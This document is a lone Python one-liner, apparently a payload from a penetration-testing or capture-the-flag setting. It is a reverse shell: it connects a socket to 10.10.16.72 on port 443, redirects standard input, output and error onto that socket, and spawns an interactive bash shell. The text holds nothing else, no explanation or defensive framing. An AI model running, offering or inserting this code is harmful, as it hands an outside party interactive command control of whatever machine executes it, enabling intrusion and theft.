import os,pty,socket;s=socket.socket();s.connect(("10.10.16.72",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")
